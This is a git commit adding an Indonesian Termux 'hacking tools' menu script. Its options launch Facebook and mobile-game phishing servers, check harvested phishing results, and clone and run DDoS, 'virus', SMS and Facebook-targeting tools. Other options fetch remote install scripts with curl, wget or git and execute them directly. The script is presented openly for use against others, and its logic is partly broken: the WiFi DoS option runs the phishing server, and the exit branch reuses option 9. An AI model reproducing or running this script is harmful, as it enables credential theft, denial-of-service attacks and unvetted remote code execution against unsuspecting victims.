a90ffff7a70780e953d94de42b83484b4829de22
MrXonee <114215468+MrXonee@users.noreply.github.com>
2022-09-23 17:55:28 +0700

    Add files via upload

---
+++ it.sh
@@ -0,0 +1,233 @@
+#!/bin/bash
+
+clear
+toilet -f future "KALI LINUX INDONESIA" | lolcat
+echo "Author : MrXonee"
+echo "___________________________________________________________________________"
+toilet -f future "Welcome To Tools MrXonee"
+toilet -f term "   /\_/\ " | lolcat
+toilet -f term " =[ •~• ]= " | lolcat
+toilet -f term "    [\]_" | lolcat
+toilet -f term " /\---------/\      J" | lolcat
+toilet -f term "| |)  •  ~  • |   R • R" | lolcat
+toilet -f term "| |^^^^^^^^^^^| M ••|•• M" | lolcat
+toilet -f term "| |^^^^^^^^^^^] M ••|•• M" | lolcat
+toilet -f term "| |ΩΩ=======ΩΩ]   R • R" | lolcat
+toilet -f term "| |___________|     J" | lolcat
+toilet -f term "\_|_________|_/ GUNAKAN DENGAN BIJAK!!!" | lolcat
+echo "___________________________________________________________________________"
+echo "ANONYMOUS INDONESIA"
+echo "Tools-MrXonee"
+echo "___________________________________________________________________________"
+sleep 1
+echo
+echo "By Mr.J Tools MrXonee"
+echo "KALI LINUX"
+echo "HACKING TOOLS"
+echo "___________________________________________________________________________"
+echo "$1[1]INSTALL PACKAGE"
+echo "$2[2]DOS WIFI EVILLIMITER"
+echo "$3[3]PHISING FACEBOOK LOGIN"
+echo "$4[4]PHISING FREEFIRE"
+echo "$5[5]PHISING MOBILE LEGENDS"
+echo "$6[6]INSTALL METASPLOIT"
+echo "$7[7]CEK HASIL PHISHING"
+echo "$8[8]DDOS ATTACK"
+echo "$9[9]MENCARI KELEMAHAN WEBSITE"
+echo "___________________________________________________________________________"
+echo "╭─[MrXonee@Bjorka]"
+read -p"╰─>> " pil
+
+if [ $pil = 1 ]
+then
+echo $i"Openning... "
+sleep 1
+clear
+sleep 1
+echo "---------------------------------------------------------------------------"
+echo "TERMUX INDONESIA D4RK-IT Mr.J"
+echo "---------------------------------------------------------------------------"
+echo "[+]SEMUA PACKAGE AKAN DI INSTALL MOHON TUNGGU BEBERAPA SAAT"
+echo "---------------------------------------------------------------------------"
+sleep 5
+apt update
+apt upgrade
+apt install toilet
+apt install python2
+apt install figlet
+apt install lolcat
+apt install openssh
+apt install autossh
+apt install php
+apt install python3
+apt install openssl
+apt install git
+apt install wget
+apt install fish
+echo "================================="
+echo "SEMUA PACKAGE BERHASIL DI INSTALL"
+echo "================================="
+sleep 3
+bash it.sh
+fi
+
+if [ $pil = 2 ]
+then
+echo $i"Openning..."
+sleep 1
+echo $cy"TERMUX INDONESIA D4RK-IT Mr.J"
+echo $ku"__________________________________"
+sleep 1
+echo $cy"  PHISING FACEBOOK SECURITY CHECK  "
+php -S 127.0.0.1:8080
+fi
+
+if [ $pil = 3 ]
+then
+echo $i"Openning..."
+sleep 1
+clear
+sleep 1
+echo $ku"---------------------------------------------------------------------------"
+echo $cy"TERMUX INDONESIA D4RK-IT Mr.J"
+echo $ku"---------------------------------------------------------------------------"
+echo $i"[+]PHISING FACEBOOK MOBILE LOGIN"
+echo $i"[+]SALIN LINK YANG ADA DI TANDA ()"
+echo $i"[+]JIKA LOG BERJALAN TANDANYA KORBAN SUDAH MASUK KE DALAM LINK"
+echo $i"[+]JIKA INGIN MELIHAT HASIL BUKA SESSION BARU LALU PILIH CEK HASIL PHISING"
+echo $ku"---------------------------------------------------------------------------"
+php -S 127.0.0.1:8080
+fi
+
+if [ $pil = 4 ]
+then
+echo $i" Coming Soon, need to update "
+fi
+
+if [ $pil = 5 ]
+then
+echo $i"Openning..."
+sleep 1
+echo $cy"TERMUX INDONESIA D4RK-IT Mr.J"
+echo $ku"_________________________________"
+echo $cy"  PHISING MOBILE LEGEND"
+php -S localhost:8080 -t ~/BLACK-IT/Ml
+fi
+
+if [ $pil = 6 ]
+then
+echo $i"Openning... "
+sleep 1
+clear
+sleep 1
+echo $ku"---------------------------------------------------------------------------"
+echo $cy"TERMUX INDONESIA D4RK-IT Mr.J"
+echo $ku"---------------------------------------------------------------------------"
+echo $i"[+]INSTALL METASPLOIT SEDANG DI PROSES"
+echo $i"[+]MOHON SISAKAN PENYIMPANAN INTERNAL (500 MB)"
+echo $i"[+]TUNGGU SAMPAI 30 MENIT UNTUK PENGINSTALLAN"
+echo $ku"---------------------------------------------------------------------------"
+echo $cy"+++++++++++++++[LOADING PAKET METASPLOIT]+++++++++++++++"
+sleep 10
+curl -LO raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
+chmod 777 metasploit.sh
+./metasploit.sh
+fi
+
+if [ $pil = 7 ]
+then
+php hasil.txt
+fi
+
+if [ $pil = 8 ]
+then
+git clone https://github.com/4NK3R-PRODUCT1ON/FULLDDOS
+cd FULLDDOS
+sh fullddos.sh
+fi
+
+if [ $pil = 9 ]
+then
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+cd RED_HAWK
+chmod 777 rhawk.php
+php rhawk.php
+fi
+
+if [ $pil = 10 ]
+then
+sleep 1
+git clone https://github.com/CiKu370/OSIF.git
+cd OSIF
+chmod 777 osif.py
+python2 osif.py
+fi
+
+if [ $pil = 11 ]
+then
+sleep 1
+git clone https://github.com/amsitlab/smsid-java
+cd smsid
+./install
+smsid
+fi
+
+if [ $pil = 12 ]
+then
+echo $i"Openning..."
+echo $ku"======================="
+echo $cy"ID = Termux"
+echo $cy"PASSWORD = ID"
+echo $ku"======================="
+sleep 1
+git clone https://github.com/storiku/virus
+cd virus
+python2 vbug.py
+fi
+
+if [ $pil = 13 ]
+then
+echo $i"Openning..."
+pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Kali/kali.sh && bash kali.sh
+chmod +x ./start-kali.sh
+./start-kali.sh
+fi
+
+if [ $pil = 14 ]
+then
+pkg install wget
+wget -O install-nethunter-termux https://offs.ec/2MceZWr
+chmod +x install-nethunter-termux
+./install-nethunter-termux
+nethunter kex passwd
+12345678
+nethunter kex &
+fi
+
+if [ $pil = 15 ]
+then
+echo $i"Openning..."
+git clone https://github.com/king-hacking/King-Hacking
+cd King-Hacking
+bash King-Tools.sh
+fi
+
+if [ $pil = 16 ]
+then
+echo $i"Openning..."
+git clone https://github.com/sqlmapproject/sqlmap
+cd sqlmap
+chmod +x *
+python2 sqlmap.py
+fi
+
+if [ $pil = 9 ]
+then
+sleep 1
+echo "============================================="
+echo "[+]TERIMAKASIH SUDAH MEMAKAI TOOLS MrXonee"
+echo "[+]SEE YOU BYE"
+echo "============================================="
+sleep 1
+exit
+fi
